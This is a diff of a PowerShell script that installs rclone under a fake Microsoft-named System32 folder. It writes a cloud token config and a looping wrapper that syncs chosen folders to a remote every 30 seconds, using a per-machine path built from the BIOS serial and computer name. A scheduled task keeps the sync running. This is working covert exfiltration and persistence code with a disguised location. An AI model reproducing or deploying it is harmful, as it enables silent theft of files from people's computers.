@@ -1,5 +1,5 @@
 #----Variabes start here.
-$rclonedlurl = "https://edef12.pcloud.com/cfZQ29UDWZJgIuO6ZydhbZZyqjb7kZ2ZZanFZZqTAh7Zx0Zb5ZvHZiVZWHZB0Z35ZW5ZOHZzVZRzZJVZi0ZNkZ80xJjWSaSyLc9Gdj2saqUYIFLUrk/Rclone.zip"
+$rclonedlurl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/Rclone.zip"
 $rootpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
 $rclonezip = Join-Path -Path $rootpath -ChildPath "Rclone.zip"
 $rcloneexepath = Join-Path -Path $rootpath -ChildPath "rclone.exe"
@@ -16,9 +16,9 @@ function Get-YesOrNo {
         [string]$fillervar
     )
     do {
-        $input = Read-Host "Do you want to modify existent $fillervar file? (y/n)"
-    } while ($input -ne "y" -and $input -ne "n")
-    return $input
+        $datain = Read-Host "Do you want to modify(if previously mod, then may be more mod required?) $fillervar file? (y/n)"
+    } while ($datain -ne "y" -and $datain -ne "n")
+    return $datain
 }
 #Function to get folder path and add additional folders to ledger.
 function Get-FolderPath {
@@ -33,14 +33,13 @@ function Get-FolderPath {
 #----Functions end.
 #----Main script begins here.
 #Cleanup
-$taskspirit = "Cleanup"
-$option = Read-Host "Proceed With $taskspirit? (y/n)::"
+$TaskName = "Cleanup?"
+$option = Read-Host "Proceed With $TaskName (y/n):"
 if ([string]::IsNullOrEmpty($option)) {
     Start-Sleep -Seconds 1
     $option = "n"
 }
-if ($option.ToLower() -eq "y") {
-    Write-Host "Proceeding with $taskspirit..."
+if ($option.ToLower() -eq "y") { 
     if (Test-Path "$rootpath\Rclone") {
         Get-Process -Name "Rclone" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
     }
@@ -68,14 +67,13 @@ if ($option.ToLower() -eq "y") {
 } else {}
 
 ##Directory creation and download section.
-$taskspirit = "Directory creation & Dl"
-$option = Read-Host "Proceed With $taskspirit? (y/n)::"
+$TaskName = "Directory creation & Download?"
+$option = Read-Host "Proceed With $TaskName (y/n):"
 if ([string]::IsNullOrEmpty($option)) {
     Start-Sleep -Seconds 1
     $option = "n"
 }
-if ($option.ToLower() -eq "y") {
-    Write-Host "Proceeding with $taskspirit..."
+if ($option.ToLower() -eq "y") {  
     if (-not (Test-Path -Path $rcloneexepath -PathType Leaf)) {
         if (-not (Test-Path -Path $rootpath -PathType Container)) {
             New-Item -ItemType Directory -Path $rootpath -Force
@@ -89,45 +87,14 @@ if ($option.ToLower() -eq "y") {
     }
 } else {}
 
-##Creationg wrapper script.
-$taskspirit = "Wrapper creation"
-$option = Read-Host "Proceed With $taskspirit? (y/n)::"
-if ([string]::IsNullOrEmpty($option)) {
-    Start-Sleep -Seconds 1
-    $option = "n"
-}
-if ($option.ToLower() -eq "y") {
-    Write-Host "Proceeding with $taskspirit..."
-$wrappercontent = @'
-$rootpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
-$rcloneexe = Join-Path -Path $rootpath -ChildPath "rclone.exe"
-$ledgerpath = Join-Path -Path $rootpath -ChildPath "syncledger"
-$rcloneconfig = Join-Path -Path $rootpath -ChildPath "rc.conf"
-$clouddrive = "remsync"
-$cdpath = "test"
-function SyncWithRclone {
-    $syncDirectories = Get-Content $ledgerpath
-    foreach ($directory in $syncDirectories) {
-        & $rcloneexe --config $rcloneconfig sync "$directory" "${clouddrive}:$cdpath"
-    }
-}
-while ($true) {
-    SyncWithRclone
-    Start-Sleep -Seconds 30
-}
-'@
-$wrappercontent | Out-File -FilePath $wrapperdestination -Encoding UTF8
-} else {}
-
 #Rc.conf - file containing remote cloud configuration for rclone.exe.
-$taskspirit = "creation/modif of rc.conf(rclone config)"
-$option = Read-Host "Proceed With $taskspirit? (y/n)::"
+$TaskName = "creation/modif of rc.conf(rclone config)?"
+$option = Read-Host "Proceed With $TaskName (y/n):"
 if ([string]::IsNullOrEmpty($option)) {
     Start-Sleep -Seconds 1
     $option = "n"
 }
-if ($option.ToLower() -eq "y") {
-    Write-Host "Proceeding with $taskspirit..."
+if ($option.ToLower() -eq "y") {  
     $fillervar = "rc.conf"
     if (Test-Path $rcloneconfigfile) {
         $viewOldFile = Read-Host "The rc.conf file already exists. Do you want to view its contents? (yes/no)"
@@ -159,56 +126,81 @@ token = {"access_token":"$token","token_type":"bearer","expiry":"0001-01-01T00:0
     }
 } else {}
 
-#Syncledger - the file that contains path to what is going to be synced creation.
-$taskspirit = "creation/modif of sync(syncledger)"
-$option = Read-Host "Proceed With $taskspirit? (y/n)::"
+##Creationg wrapper script.
+$TaskName = "Wrapper creation?"
+$option = Read-Host "Proceed With $TaskName (y/n):"
 if ([string]::IsNullOrEmpty($option)) {
     Start-Sleep -Seconds 1
     $option = "n"
 }
-if ($option.ToLower() -eq "y") {
-    Write-Host "Proceeding with $taskspirit..."
+if ($option.ToLower() -eq "y") {  
+$wrappercontent = @'
+$rootpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
+$rcloneexe = Join-Path -Path $rootpath -ChildPath "rclone.exe"
+$ledgerpath = Join-Path -Path $rootpath -ChildPath "syncledger"
+$rcloneconfig = Join-Path -Path $rootpath -ChildPath "rc.conf"
+$clouddrive = "remsync"
+$systemserialnumberraw = (Get-WmiObject -Class Win32_BIOS).SerialNumber
+$trimmedSerial = $systemserialnumberraw.Substring(0, [Math]::Min(4, $systemserialnumberraw.Length)).ToLower()
+$systemnametrimmed = $env:COMPUTERNAME.Substring([Math]::Max(0, $env:COMPUTERNAME.Length - 4), [Math]::Min(4, $env:COMPUTERNAME.Length)).ToLower()
+$pathforcloud = "$($trimmedSerial)-$($systemnametrimmed)"
+function SyncWithRclone {
+    $syncDirectories = Get-Content $ledgerpath
+    foreach ($directory in $syncDirectories) {
+        & $rcloneexe --config $rcloneconfig sync "$directory" "${clouddrive}:$pathforcloud"
+    }
+}
+while ($true) {
+    SyncWithRclone
+    Start-Sleep -Seconds 30
+}
+'@
+$wrappercontent | Out-File -FilePath $wrapperdestination -Encoding UTF8
+} else {}
+
+#Syncledger - the file that contains path to what is going to be synced creation.
+$TaskName = "creation/modif of file(syncledger) that should contain list of folders to be synced?"
+$option = Read-Host "Proceed With $TaskName (y/n):"
+if ([string]::IsNullOrEmpty($option)) {
+    Start-Sleep -Seconds 1
+    $option = "n"
+}
+if ($option.ToLower() -eq "y") {  
     $fillervar = "SyncLedger"
     if (Test-Path $syncledgerfile) {
-        $viewOldFile = Read-Host "A syncledger file already exists. Do you want to view its contents? (yes/no)"
-        if ($viewOldFile -eq "yes") {
-            Write-Host "Contents of syncledger file:"
-            Get-Content $syncledgerfile
-            do {
-                $continue = Read-Host "Do you want to continue with creating a new file and deleting the old file? (yes/no)"
-                if ($continue -eq "no") {
-                    Write-Host "Continuing without creating a new file."
-                    break
+        Write-Host "A syncledger file already exists."
+        Get-Content $syncledgerfile
+        $continue = Read-Host "Do you want to continue with creating a new file and deleting the old file? (y/n)"
+        if ($continue -eq "n") {
+            Write-Host "Continuing without creating a new file."
+        } else {
+            Write-Host "Creating a new file and deleting the old file..."
+            if ($continue -eq "y" -or -not (Test-Path $syncledgerfile)) {
+                $destinations = @()
+                do {
+                    $destination = Get-FolderPath
+                    $destinations += $destination
+                    $choice = Get-YesOrNo -fillervar $fillervar
+                } while ($choice -eq "y")
+                $destinations | ForEach-Object {
+                    $_ -replace '\\', '/' | Out-File -FilePath $syncledgerfile -Append -Encoding UTF8
                 }
-            } while ($continue -ne "yes")
+                Write-Host "Syncledger file has been created at: $syncledgerfile"
+            }
         }
-        else {
-            Write-Host "Continuing without viewing the old file."
-        }
-    }
-    if ($continue -eq "yes" -or -not (Test-Path $syncledgerfile)) {
-        $destinations = @()
-        do {
-            $destination = Get-FolderPath
-            $destinations += $destination
-            $choice = Get-YesOrNo -fillervar $fillervar
-        } while ($choice -eq "yes")
-        $destinations | ForEach-Object {
-            $_ -replace '\\', '/' | Out-File -FilePath $syncledgerfile -Append -Encoding UTF8
-        }
-        Write-Host "Syncledger file has been created at: $syncledgerfile"
+    } else {
+        Write-Host "The syncledger file does not exist."
     }
 } else {}
 
 #Windows Task Creation for rclone continuous sync.
-$taskspirit = "sync task creation for rclone.exe"
-$option = Read-Host "Proceed With $taskspirit? (y/n)::"
+$TaskName = "scheduled task creation for rclone.exe?"
+$option = Read-Host "Proceed With $TaskName (y/n):"
 if ([string]::IsNullOrEmpty($option)) {
     Start-Sleep -Seconds 1
     $option = "n"
 }
 if ($option.ToLower() -eq "y") {
-    Write-Host "Proceeding with $taskspirit..."
     $taskxml = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -278,5 +270,5 @@ if (Get-ScheduledTask -TaskName $rclonetask -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName $rclonetask -Confirm:$false
 } else {}
 Register-ScheduledTask -Xml $taskxml -TaskName $rclonetask | Out-Null
-Start-ScheduledTask -TaskName $taskxml
+Start-ScheduledTask -TaskName $rclonetask
 } else {}
